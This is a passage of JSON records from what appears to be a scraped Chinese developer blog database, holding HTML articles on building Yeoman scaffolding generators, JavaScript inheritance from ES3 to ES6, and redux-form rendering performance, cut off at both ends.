class=\"heading\"\u003e和文件系统交互\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e位置环境和路径\u003c/h3\u003e\n\u003cp\u003eyeoman 文件功能是基于硬盘上的两个地址环境的，他们分别是生成器最长操作的读取和写入文件夹。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e目标环境\u003c/h3\u003e\n\u003cp\u003e第一个环境是目标环境。这个目标环境是 yeoman 创建脚手架应用的文件夹，也就是你的项目文件夹。\u003c/p\u003e\n\u003cp\u003e目的地环境通常是当前目录或者包含 .yo-rc.json 文件的最近父文件夹。.yo-rc.json 文件定义了 yeoman 工程的根目录。这个文件允许你的用户在子目录中运行命令。\u003c/p\u003e\n\u003cp\u003e可以通过 generator.destinationRoot() 或者 generator.destinationPath('sub/path') 获取目标路径。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// Given destination root is ~/projects\nclass extends Generator {\n  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003epaths\u003c/span\u003e\u003c/span\u003e() {\n    this.destinationRoot();\n    // returns \u003cspan class=\"hljs-string\"\u003e'~/projects'\u003c/span\u003e\n\n    this.destinationPath(\u003cspan class=\"hljs-string\"\u003e'index.js'\u003c/span\u003e);\n    // returns \u003cspan class=\"hljs-string\"\u003e'~/projects/index.js'\u003c/span\u003e\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e你可以通过 generator.destinationRoot('new/path') 手动修改目标路径。但是为了便于维护，最好不要修改默认路径。\u003c/p\u003e\n\u003cp\u003e如果你想知道用户是在哪里运行  yo 命令的，你可以通过 this.contextRoot 获取该路径。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e模板环境\u003c/h3\u003e\n\u003cp\u003e模板环境是你存储模板文件的文件夹，这通常是你将要读取和拷贝的文件夹。\u003c/p\u003e\n\u003cp\u003e模板环境默认为 ./templates/ ，可以通过 generator.sourceRoot('new/template/path') 进行重写。\u003c/p\u003e\n\u003cp\u003e可以通过 generator.sourceRoot() 或 generator.templatePath('app/index.js') 获取模板路径。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eclass extends Generator {\n \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003epaths\u003c/span\u003e\u003c/span\u003e() {\n   this.sourceRoot();\n   // returns \u003cspan class=\"hljs-string\"\u003e'./templates'\u003c/span\u003e\n\n   this.templatePath(\u003cspan class=\"hljs-string\"\u003e'index.js'\u003c/span\u003e);\n   // returns \u003cspan class=\"hljs-string\"\u003e'./templates/index.js'\u003c/span\u003e\n }\n};\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e文件功能\u003c/h3\u003e\n\u003cp\u003e生成器将所有方法都暴露于 this.fs , this.fs 是 \u003ca target=\"_blank\" href=\"https://github.com/sboudrias/mem-fs-editor\"\u003emem-fs editor\u003c/a\u003e的实例，可自行学习其 API 。\u003c/p\u003e\n\u003cp\u003e不过 commit 方法没任何价值，不要在你的生成器中使用。yeoman 会在生命周期的 confilcts 阶段自行调用。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e实例：拷贝一个模板文件\u003c/h4\u003e\n\u003cp\u003e模板文件如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;html\u0026gt;\n  \u0026lt;head\u0026gt;\n    \u0026lt;title\u0026gt;\u0026lt;%= title %\u0026gt;\u0026lt;/title\u0026gt;\n  \u0026lt;/head\u0026gt;\n\u0026lt;/html\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们通过 copyTpl 方法拷贝文件。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eclass extends Generator {\n  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003ewriting\u003c/span\u003e\u003c/span\u003e() {\n    this.fs.copyTpl(\n      this.templatePath(\u003cspan class=\"hljs-string\"\u003e'index.html'\u003c/span\u003e),\n      this.destinationPath(\u003cspan class=\"hljs-string\"\u003e'public/index.html'\u003c/span\u003e),\n      { title: \u003cspan class=\"hljs-string\"\u003e'Templating with Yeoman'\u003c/span\u003e }\n    );\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e运行生成器， public/index.html 将包含如下内容:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;html\u0026gt;\n  \u0026lt;head\u0026gt;\n    \u0026lt;title\u0026gt;Templating with Yeoman\u0026lt;/title\u0026gt;\n  \u0026lt;/head\u0026gt;\n\u0026lt;/html\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e通过流转换输出文件\u003c/h4\u003e\n\u003cp\u003e生成器系统允许你对每个文件进行自定义过滤处理。自动美化文件、格式化空白等也都是可以的。\u003c/p\u003e\n\u003cp\u003eyeoman 运行过程中，文件将被一个 vinyl 对象流（像 gulp 一样）处理，任何生成器的作者都可以注册一个流转换来修改文件路径和内容。\u003c/p\u003e\n\u003cp\u003e示例如下:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar beautify = require(\u003cspan class=\"hljs-string\"\u003e'gulp-beautify'\u003c/span\u003e);\nthis.registerTransformStream(beautify({indent_size: 2 }));\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e注意每个任何类型的文件都会被流处理。要确保不被支持的文件会被流转换器过滤掉。像 gulp-if 或 gulp-filter 之类的工具会帮我们过滤非法类型的文件。\u003c/p\u003e\n\u003cp\u003e在生成文件的 writing 阶段，你可以在 yeoman 流转换中使用任何 gulp 插件。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003edemo\u003c/h2\u003e\n\u003cp\u003e根据以上教程，开发了一个基于 yoeman 的 vue ui 组件脚手架生成器 \u003ca target=\"_blank\" href=\"https://github.com/korbinzhao/generator-vueui\"\u003egenerator-vueui\u003c/a\u003e。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e使用方法\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003enpm install -g yo\nnpm install -g generator-vueui\n\nmkdir vueui-example\n\u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e vueui-example\n\nyo vueui\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e原文地址：\u003ca target=\"_blank\" href=\"https://korbinzhao.github.io/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/%E8%84%9A%E6%89%8B%E6%9E%B6/2017/12/31/yeoman-generator/\"\u003e如何开发自己的 yeoman 脚手架 - korbinzhao 的博客\u003c/a\u003e\u003c/p\u003e\n","buildTime":"1514894451.4812","__v":0}
{"_id":{"$oid":"5a4b76a6b11e1a170cb138ef"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"","meta":{"likeCount":0},"tag":[],"comment":[],"shortContent":"","content":"\u003ch2 class=\"heading\"\u003e选择一种继承方式\u003c/h2\u003e\n\u003cp\u003eJavaScript 是一门动态语言，动态意味着高灵活性，而这尤其可以体现在继承上面。JavaScript 中的继承有很多种实现方式，可以分成下面四类：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eMixin 模式，即属性混入，从一个或多个对象中复制属性到新的对象中\u003c/li\u003e\n\u003cli\u003e方法借用模式，即通过 call 或 apply 实现方法的重用\u003c/li\u003e\n\u003cli\u003e原型模式，使用 Object.create 方法直接以一个对象为原型创造新的对象\u003c/li\u003e\n\u003cli\u003e类模式，实际上是使用构造函数或 ES6 class\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e前三种有一个共同点，就是没有“类”的概念，它们在适当的场景下非常有用，不过也因为没有类，缺失了很多经典面向对象继承的要素。例如父子对象之间没有严格的传承关系，即不一定是 is-a 的关系，这决定了无法将它们直接应用在面向对象分析与设计方面，可以说它们并不是真正的继承，而是介于继承和组合之间的代码复用方案。\u003c/p\u003e\n\u003cp\u003e而第四种，类式继承，无论是使用构造函数还是 ES6 加入的 class，都能表达明确的继承关系，在需要对继承重度使用的场景下，应该使用类式继承。接下来，本文讨论的都是类式继承。\u003c/p\u003e\n\u003cp\u003e有一点需要牢记：继承是一种强耦合，应该谨慎使用。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e如何学习 JavaScript 中的继承\u003c/h2\u003e\n\u003cp\u003e理解 JavaScript 里面的类继承实现方式，我认为最好的方法是——找一门面向对象机制更为完善的语言，去理解其中的继承。实际上，JavaScript 中以前就有的 new 和 ES6 加入的 class，都是参考自 Java 语言。\u003c/p\u003e\n\u003cp\u003e不过，这样的对照学习是有前提条件的，即首先掌握 JavaScript 中的原型、原型链和作用域，否则很容易误解 JavaScript 本质的执行机制。如果已经理解了这些前置知识，就可以探索一下 JavaScript 中的继承了。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e用 ES3 实现继承\u003c/h2\u003e\n\u003cp\u003e实现要点：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e利用 Person.call(this) 执行“方法借用”，获取 Person 的属性\u003c/li\u003e\n\u003cli\u003e利用一个空函数将 Person.prototype 加入原型链\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ePerson\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ename\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name = name;\n}\n\nPerson.prototype.printName = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name);\n};\n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eBob\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  Person.call(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"Bob\"\u003c/span\u003e);\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.hobby = \u003cspan class=\"hljs-string\"\u003e\"Histroy\"\u003c/span\u003e;\n}\n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003einheritProto\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eParent, Child\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e Fn = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{};\n  Fn.prototype = Parent.prototype;\n  Child.prototype = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Fn();\n  Child.prototype.constructor = Child;\n}\n\ninheritProto(Person, Bob);\n\nBob.prototype.printHobby = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.hobby);\n};\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.dir(\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Bob());\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003edir 输出：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eBob\n  |-- hobby:\"Histroy\"\n  |-- name:\"Bob\"\n  |-- __proto__:Person\n      |-- printHobby:ƒ ()\n      |-- constructor:ƒ Bob()\n      |-- __proto__:\n          |-- printName:ƒ ()\n          |-- constructor:ƒ Person(name)\n          |-- __proto__:Object\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 class=\"heading\"\u003e用 ES5 实现继承\u003c/h2\u003e\n\u003cp\u003e实现要点：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e利用 Person.call(this) 执行“方法借用”，获取 Person 的属性\u003c/li\u003e\n\u003cli\u003e利用 ES5 增加的 Object.create 方法将 Person.prototype 加入原型链\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ePerson\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ename\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name = name;\n}\n\nPerson.prototype.printName = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name);\n};\n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eBob\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  Person.call(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"Bob\"\u003c/span\u003e);\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.hobby = \u003cspan class=\"hljs-string\"\u003e\"Histroy\"\u003c/span\u003e;\n}\n\nBob.prototype  = \u003cspan class=\"hljs-built_in\"\u003eObject\u003c/span\u003e.create(Person.prototype, {\n  \u003cspan class=\"hljs-attr\"\u003econstructor\u003c/span\u003e: {\n    \u003cspan class=\"hljs-attr\"\u003evalue\u003c/span\u003e: Bob,\n    \u003cspan class=\"hljs-attr\"\u003eenumerable\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003econfigurable\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003ewritable\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n  }\n});\n\nBob.prototype.printHobby = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.hobby);\n};\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.dir(\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Bob());\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003edir 输出：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eBob\n  |-- hobby:\"Histroy\"\n  |-- name:\"Bob\"\n  |-- __proto__:Person\n      |-- printHobby:ƒ ()\n      |-- constructor:ƒ Bob()\n      |-- __proto__:\n          |-- printName:ƒ ()\n          |-- constructor:ƒ Person(name)\n          |-- __proto__:Object\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 class=\"heading\"\u003e用 ES6 实现继承\u003c/h2\u003e\n\u003cp\u003e实现要点：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e利用 ES6 增加的 class 和 extends 实现比以前更完善的继承\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ePerson\u003c/span\u003e \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e(name) {\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name = name;\n  }\n\n  printName() {\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name);\n  }\n}\n\n\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eBob\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eextends\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ePerson\u003c/span\u003e \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e() {\n    \u003cspan class=\"hljs-keyword\"\u003esuper\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Bob\"\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.hobby = \u003cspan class=\"hljs-string\"\u003e\"Histroy\"\u003c/span\u003e;\n  }\n\n  printHobby() {\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.hobby);\n  }\n}\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.dir(\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Bob());\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003edir 输出：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eBob\n  |-- hobby:\"Histroy\"\n  |-- name:\"Bob\"\n  |-- __proto__:Person\n      |-- constructor:class Bob\n      |-- printHobby:ƒ printHobby()\n      |-- __proto__:\n          |-- constructor:class Person\n          |-- printName:ƒ printName()\n          |-- __proto__:Object\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 class=\"heading\"\u003e从 class 和 super 看 JavaScript 与 Java 的继承\u003c/h2\u003e\n\u003cp\u003e编写代码时，ES6 class 带来的最明显的两个便利是：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e隐藏原型链的拼接过程，将代码的重点放在类型之间的传承\u003c/li\u003e\n\u003cli\u003e使用 super 来实现更简化、更灵活的多态方法\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e实际上，ES6 围绕 class 增加了很多新功能，比如继承这件事情上，与之前不同的是：用 class 实现的继承，既包括类实例的继承关系，也包括类本身的继承关系。这里的类其实是特殊的 JavaScript 函数，而在 JavaScript 中，函数是对象的子类型，即函数对象，所以也能够体现出原型继承。\u003c/p\u003e\n\u003cp\u003e例如，用前面的代码来说明就是：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 类实例的继承关系\u003c/span\u003e\nBob.prototype.__proto__ === Person.prototype \u003cspan class=\"hljs-comment\"\u003e// true\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e// 类本身的继承关系\u003c/span\u003e\nBob.__proto__ === Person \u003cspan class=\"hljs-comment\"\u003e// true\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e再来看 ES6 中的 super，子类的方法想借助父类的方法完成一部分工作时，super 就可以派上用场了，这是比继承更为细粒度的代码复用，不过耦合性也也变得更强了。实际上 super 也有很多功能，既可以当作函数使用，也可以当作对象使用。将 class 和 super 结合起来看，就可以领会一下 JavaScript 与 Java 在继承上的异同了。\u003c/p\u003e\n\u003cp\u003e与 Java 相同或非常类似的是：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e在子类构造方法中调用父类的构造方法。ES6 中，子类的构造器中必须调用父类的构造器来完成初始化，子类的实例是基于父类实例的加工。正是因此，父类的所有行为都可以继承。所以，ES6 中可以继承原生数据结构的完整功能，在此基础上定义自己的数据结构。就像 Java 中继承 HashMap 类，JavaScript 可以继承 Number、Array 等构造函数。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e与 Java 不同的是：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e在普通方法中，super 可以调用的是父类的原型对象上的方法（可以理解为 super 此时指向父类的原型对象）；在静态方法中，super 可以调用父类的静态方法（可以理解为 super 此时指向父类）。而在 Java 中，通过 super 可以访问父类中被覆盖的同名变量或者方法，要访问静态方法则是通过“类名.方法名”或“对象名.方法名”。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e比较后可见，真的是和 Java 非常类似。\u003c/p\u003e\n\u003cp\u003e结合前面的内容，可以发现从 ES3 到 ES6，JavaScript 中的面向对象部分一直是在向 Java 靠拢的。尤其增加了 class 和 extends 关键字之后，靠拢了一大步。但这些并没有改变 JavaScript 是基于原型这一实质。Java 中的类就像对象的设计图，每次调用 new 创建一个新的对象，就产生一个独立的对象占用独立的内存空间；而在 JavaScript，继承所做工作实际上是在构造原型链，所有子类的实例共享的是同一个原型。所以 JavaScript 中调用父类的方法实际上是在不同的对象上调用同一个方法，即“方法借用”，这种行为实际上是“委托（delegation）”调用。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e扩展阅读\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"http://es6.ruanyifeng.com/#docs/class-extends#super-%E5%85%B3%E9%94%AE%E5%AD%97\"\u003eECMAScript 6 入门：Class 的继承 - super 关键字\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 class=\"heading\"\u003e参考资料\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://github.com/jayli/javascript-patterns/blob/master/chapter6.markdown#%E7%B1%BB%E5%BC%8F%E7%BB%A7%E6%89%BF-vs-%E7%8E%B0%E4%BB%A3%E7%BB%A7%E6%89%BF%E6%A8%A1%E5%BC%8F\"\u003e《JavaScript模式》- 类式继承 vs 现代继承模式\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"http://www.ituring.com.cn/book/946\"\u003e《JavaScript高级程序设计（第3版）》- 面向对象的程序设计\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"http://www.ituring.com.cn/book/1488\"\u003e《你不知道的JavaScript》- this和对象原型\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e\n","buildTime":"1514895008631","__v":0}
{"_id":{"$oid":"5a4b76d92239bd131cd79f39"},"id":"5a47b7e46fb9a0450671f6b1","author":{"$oid":"5a4b76d92239bd131cd79f31"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/31/160a828c12888134?w=300\u0026h=223\u0026f=png\u0026s=53680"],"screenShot":null}],"title":"redux-form性能优化","meta":{"likeCount":0},"tag":["React.js","Redux"],"comment":[],"shortContent":"组件过多渲染导致! 更改一个输入框导致所有输入框都重新渲染。 下面代码我在FormMembers里遍历了fields，所以FormMembers重新渲染时会导致fields全部重新渲染。","content":"\u003cp\u003e最近项目中使用redux-form遇上性能瓶颈，\u003c/p\u003e\n\u003cp\u003e需要100行以上联动表单变得极其卡\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/31/160a828c12888134?w=300\u0026amp;h=223\u0026amp;f=png\u0026amp;s=53680\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e原因\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e组件过多渲染导致! 更改一个输入框导致所有输入框都重新渲染。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003e解决思路\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eField 使用 PureComponent 减少不必要的渲染[如果无效用shouldComponentUpdate ]\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e推荐使用shouldComponentUpdate 精确控制到每行及每个输入框的渲染\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e覆盖掉redux-from的onChange事件 改用onFocus和onBlur\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e下面代码我在FormMembers里遍历了fields，所以FormMembers重新渲染时会导致fields全部重新渲染。\u003c/p\u003e\n\u003cp\u003e优化后使用shouldComponentUpdate控制到每一行及每一个输入框的重新渲染，提高了非常多的性能！\u003c/p\u003e\n\u003cp\u003e优化前代码及结构\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e//表单\nclass Form extends Component{\n\u0009\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e() {\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\n\u0009\u0009\u0009\u0026lt;div\u0026gt;\n\u0009\u0009\u0009\u0009\u0026lt;form onSubmit={()=\u0026gt;{}}\u0026gt;\n\u0009\u0009\u0009\u0009\u0009\u0026lt;table className=\u003cspan class=\"hljs-string\"\u003e\"recipe_table\"\u003c/span\u003e \u0026gt;\n\u0009\u0009\u0009\u0009\u0009\u0026lt;FieldArray\n\u0009\u0009\u0009\u0009\u0009\u0009name=\u003cspan class=\"hljs-string\"\u003e\"members\"\u003c/span\u003e\n\u0009\u0009\u0009\u0009\u0009\u0009recipeName=\u003cspan class=\"hljs-string\"\u003e\"herbal\"\u003c/span\u003e\n\u0009\u0009\u0009\u0009\u0009\u0009component={FormMembers}\n\u0009\u0009\u0009\u0009\u0009\u0009change={change}\n\u0009\u0009\u0009\u0009\u0009\u0009public_expense={public_expense}\n\u0009\u0009\u0009\u0009\u0009/\u0026gt;\n\u0009\u0009\u0009\u0009\u0009\u0026lt;/table\u0026gt;\n\u0009\u0009\u0009\u0009\u0026lt;/form\u0026gt;\n\u0009\u0009\u0009\u0026lt;/div\u0026gt;)\n\u0009}\n}\n//Members\nclass FormMembers extends Component{\n\u0009\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e() {\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e {fields}=this.props;\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e(\n\u0009\u0009\u0026lt;tbody\u0026gt;\n\u0009\u0009{fields.map((item,key)=\u0026gt;{\n\u0009\u0009\u0009console.log(\u003cspan class=\"hljs-string\"\u003e'//此处省略大量计算'\u003c/span\u003e)\n\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\n\u0009\u0009\u0009\u0009\u0026lt;tr key={key} \u0026gt;\n\u0009\u0009\u0009\u0009\u0009\u0026lt;td\u0026gt;\n\u0009\u0009\u0009\u0009\u0009\u0026lt;Field name={`\u003cspan class=\"hljs-variable\"\u003e${item}\u003c/span\u003e.name`} component={Field}/\u0026gt;\n\u0009\u0009\u0009\u0009\u0009\u0026lt;/td\u0026gt;\n\u0009\u0009\u0009\u0009\u0026lt;/tr\u0026gt;\n\u0009\u0009\u0009\u0009)\n\u0009\u0009})}\n\u0009\u0009\u0026lt;/tbody\u0026gt;)\n\u0009}\n}\n//数字输入框\nclass Field extends Component{\n\u0009\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e(){\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e {input}=this.props;\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u0026lt;input {...input} /\u0026gt;\n\u0009}\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e优化后\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport isEqual from \u003cspan class=\"hljs-string\"\u003e\"lodash/isEqual\"\u003c/span\u003e;\n//表单\nclass Form extends Component{\n\u0009\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e() {\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\n\u0009\u0009\u0009\u0026lt;div\u0026gt;\n\u0009\u0009\u0009\u0009\u0026lt;form onSubmit={()=\u0026gt;{}}\u0026gt;\n\u0009\u0009\u0009\u0009\u0009\u0026lt;table className=\u003cspan class=\"hljs-string\"\u003e\"recipe_table\"\u003c/span\u003e \u0026gt;\n\u0009\u0009\u0009\u0009\u0009\u0026lt;FieldArray\n\u0009\u0009\u0009\u0009\u0009\u0009name=\u003cspan 